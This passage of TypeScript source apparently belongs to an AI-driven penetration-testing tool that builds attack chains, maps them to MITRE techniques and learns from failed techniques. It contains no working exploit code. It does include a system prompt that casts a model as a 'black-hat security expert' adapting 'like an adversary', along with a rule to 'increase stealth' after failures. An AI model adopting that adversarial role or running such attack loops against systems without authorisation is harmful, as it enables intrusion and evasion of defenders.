      const parsed = JSON.parse(jsonMatch[0]);
      return { id: crypto.randomUUID(), findings: findings.slice(0, 5).map(f => f.id), ...parsed };
    }
  } catch {}
  return null;
}

function calculateRiskScore(correlations: Correlation[]): number {
  if (correlations.length === 0) return 0;
  const totalRisk = correlations.reduce((sum, c) => sum + (c.risk_amplification * c.exploitation_probability * 10), 0);
  return Math.min(100, Math.round(totalRisk));
}

async function generateAttackChains(correlations: Correlation[], context: any): Promise<AttackChain[]> {
  return correlations.map(correlation => ({
    id: crypto.randomUUID(),
    name: `Attack Chain: ${correlation.attack_path}`,
    steps: generateAttackSteps(correlation),
    success_probability: correlation.exploitation_probability,
    impact: correlation.risk_amplification > 1.3 ? 'Critical' : 'High',
    mitre_mapping: getMitreMapping(correlation.attack_path)
  }));
}

function generateAttackSteps(correlation: Correlation): AttackStep[] {
  const steps: AttackStep[] = [
    { order: 1, tool: 'reconnaissance', action: 'Information gathering', target_component: 'External surface', expected_outcome: 'Target mapping', dependencies: [] },
    { order: 2, tool: 'vulnerability-scanner', action: 'Vulnerability assessment', target_component: 'Identified services', expected_outcome: 'Vulnerability list', dependencies: ['1'] },
    { order: 3, tool: 'exploit-framework', action: 'Exploitation + PoC', target_component: 'Vulnerable service', expected_outcome: 'Confirmed exploit with evidence', dependencies: ['2'] }
  ];
  if (correlation.risk_amplification > 1.3) {
    steps.push({ order: 4, tool: 'privilege-escalation', action: 'Privilege escalation', target_component: 'Compromised system', expected_outcome: 'Elevated privileges', dependencies: ['3'] });
  }
  return steps;
}

function getMitreMapping(attackPath: string): string[] {
  const mappings: string[] = [];
  if (attackPath.includes('Critical') || attackPath.includes('chain') || attackPath.includes('Confirmed')) {
    mappings.push(...MITRE_TECHNIQUES.initial_access, ...MITRE_TECHNIQUES.execution);
  }
  if (attackPath.includes('exploitation') || attackPath.includes('lateral')) {
    mappings.push(...MITRE_TECHNIQUES.lateral_movement, ...MITRE_TECHNIQUES.privilege_escalation);
  }
  if (attackPath.includes('pattern') || attackPath.includes('Repeated')) {
    mappings.push(...MITRE_TECHNIQUES.discovery);
  }
  return [...new Set(mappings)].slice(0, 6);
}

async function processLearning(result: any, technique: string, targetType: string, context: any): Promise<any> {
  const learning: any = {
    technique, target_type: targetType,
    success: result.success, execution_time: result.execution_time,
    findings_count: result.findings?.length || 0, timestamp: new Date().toISOString()
  };
  if (!result.success || (result.findings?.length === 0)) {
    learning.adaptation_strategy = await generateAdaptationStrategy(technique, targetType, context);
    learning.next_action = learning.adaptation_strategy?.recommended_action || 'try_alternative_technique';
  } else {
    learning.analysis = `${technique} successful with ${result.findings?.length || 0} findings`;
    learning.next_action = 'continue_with_variations';
  }
  learning.confidence = calculateTechniqueConfidence(result);
  return learning;
}

async function generateAdaptationStrategy(technique: string, targetType: string, context: any): Promise<any> {
  if (!LOVABLE_API_KEY) {
    return { recommended_action: 'try_alternative_technique', alternative_techniques: ['nuclei', 'nikto', 'whatweb'] };
  }
  try {
    const response = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          { role: 'system', content: 'You are a black-hat security expert. When attacks fail, adapt like an adversary. Suggest alternative exploitation paths. JSON response.' },
          { role: 'user', content: `"${technique}" failed against "${targetType}". Context: ${JSON.stringify(context)}\\nJSON: {"recommended_action":"action","alternative_techniques":["t1"],"reasoning":"brief","escalation_path":"how to go deeper"}` }
        ],
        max_tokens: 300
      })
    });
    if (!response.ok) throw new Error('AI error');
    const result = await response.json();
    const content = result.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (jsonMatch) return JSON.parse(jsonMatch[0]);
  } catch {}
  return { recommended_action: 'try_alternative_technique', alternative_techniques: ['nuclei', 'nikto'] };
}

function calculateTechniqueConfidence(result: any): number {
  let confidence = 0.5;
  if (result.success) confidence += 0.2;
  if (result.findings?.length > 0) confidence += 0.1 * Math.min(result.findings.length, 3);
  if (result.execution_time < 5000) confidence += 0.1;
  return Math.min(0.95, confidence);
}

async function fineTuneAgentModel(trainingData: any[], modelType: string): Promise<any> {
  const patterns = extractPatterns(trainingData);
  return {
    model_type: modelType, training_samples: trainingData.length, patterns_extracted: patterns.length,
    improvements: {
      technique_weights: calculateTechniqueWeights(trainingData),
      target_type_mappings: extractTargetMappings(trainingData),
      adaptation_rules: generateAdaptationRules(patterns)
    },
    new_confidence: Math.min(0.95, 0.7 + (patterns.length * 0.02))
  };
}

function extractPatterns(data: any[]): any[] {
  const patterns: any[] = [];
  const successful = data.filter(d => d.success);
  const successTechniques = successful.map(d => d.technique);
  [...new Set(successTechniques)].forEach(tech => {
    patterns.push({ type: 'success_pattern', technique: tech, frequency: successTechniques.filter(t => t === tech).length });
  });
  return patterns;
}

function calculateTechniqueWeights(data: any[]): Record<string, number> {
  const weights: Record<string, number> = {};
  data.forEach(d => {
    const tech = d.technique || 'unknown';
    if (!weights[tech]) weights[tech] = 0.5;
    weights[tech] = d.success ? Math.min(1.0, weights[tech] + 0.1) : Math.max(0.1, weights[tech] - 0.05);
  });
  return weights;
}

function extractTargetMappings(data: any[]): Record<string, string[]> {
  const mappings: Record<string, string[]> = {};
  data.filter(d => d.success).forEach(d => {
    const target = d.target_type || 'generic';
    if (!mappings[target]) mappings[target] = [];
    if (d.technique && !mappings[target].includes(d.technique)) mappings[target].push(d.technique);
  });
  return mappings;
}

function generateAdaptationRules(patterns: any[]): any[] {
  return patterns.filter(p => p.frequency >= 2).map(p => ({
    condition: `technique_failed_${p.technique}`, action: 'increase_stealth', alternative: 'try_next_technique'
  }));
}

async function generateAgentRecommendations(target: string, currentPhase: string, existingFindings: Finding[], historicalData: any[]): Promise<any> {
  const successPatterns = historicalData.filter(h => h.success);
  const topTechniques = [...new Set(successPatterns.map(h => h.tool_used))].slice(0, 5);
  const phaseScans = PHASE_SCAN_TYPES[currentPhase] || PHASE_SCAN_TYPES.recon;
  const prioritizedTools = [...topTechniques.filter(t => phaseScans.includes(t)), ...phaseScans.filter(t => !topTechniques.includes(t))];

  return {
    recommended_tools: prioritizedTools.slice(0, 5),
    priority_targets: existingFindings.filter(f => f.severity === 'critical' || f.severity === 'high').map(f => f.title).slice(0, 3),
    suggested_techniques: topTechniques,
    mitre_techniques: MITRE_TECHNIQUES[currentPhase as keyof typeof MITRE_TECHNIQUES] || MITRE_TECHNIQUES.recon,
    confidence: historicalData.length < 5 ? 0.5 : 0.5 + (successPatterns.length / historicalData.length) * 0.4,
    next_phase_readiness: existingFindings.length >= 5 ? 'ready' : 'gathering_intel'
  };
}

async function getPhaseStrategy(phase: string, target: string, objective: string, currentFindings: Finding[]): Promise<any> {
  if (!LOVABLE_API_KEY) return { strategy: 'default', tools: PHASE_SCAN_TYPES[phase] || [] };
  try {
    const response = await fetch(AI_GATEWAY_URL, {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: 'google/gemini-2.5-flash',
        messages: [
          { role: 'system', content: 'Expert red team AI. Brief JSON.' },
          { role: 'user', content: `Phase: ${phase}\\nTarget: ${target}\\nObjective: ${objective}\\nFindings: ${currentFindings.length}\\nJSON: {"priority_scans":["scan1"],"reasoning":"brief","risk_areas":["area1"]}` }
        ],
        max_tokens: 300
      })
    });
    if (!response.ok) return { strategy: 'default' };
    const result = await response.json();
    const content = result.choices?.[0]?.message?.content || '';
    const jsonMatch = content.match(/\{[\s\S]*\}/);
    if (jsonMatch) return JSON.parse(jsonMatch[0]);
  } catch {}
  return { strategy: 'default' };
}
